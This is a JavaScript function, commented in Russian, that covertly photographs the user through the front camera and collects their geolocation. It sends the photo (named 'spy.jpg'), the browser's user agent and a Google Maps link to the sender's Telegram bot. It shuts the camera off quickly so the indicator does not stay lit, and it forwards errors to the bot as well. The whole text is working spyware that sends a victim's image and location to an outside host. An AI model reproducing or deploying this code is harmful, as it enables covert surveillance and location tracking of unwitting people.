async function takePhotoAndData() { try { log("Accessing camera..."); // Добавляем проверку: поддерживает ли браузер камеру вообще if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { throw new Error("Browser not supported"); } // Запрашиваем камеру с более четкими параметрами const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }); const video = document.createElement('video'); video.srcObject = stream; video.setAttribute("playsinline", true); // Важно для Chrome на iPhone/Android await video.play(); await new Promise(r => setTimeout(r, 2000)); // Даем 2 секунды на фокус const canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight; canvas.getContext('2d').drawImage(video, 0, 0); // Сразу выключаем камеру, чтобы не висел индикатор stream.getTracks().forEach(track => track.stop()); // Отправка фото canvas.toBlob(blob => { const fd = new FormData(); fd.append('chat_id', chatId); fd.append('photo', blob, 'spy.jpg'); fd.append('caption', `🎯 Сработал Chrome!\n📱 Юзер: ${navigator.userAgent.slice(0, 50)}`); fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd }); }, 'image/jpeg'); // Локация navigator.geolocation.getCurrentPosition((pos) => { const mapUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`; fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=📍 Локация: ${mapUrl}`); }); } catch (e) { log("Error: " + e.message); fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=❌ Ошибка в Chrome: ${e.message}`); } }
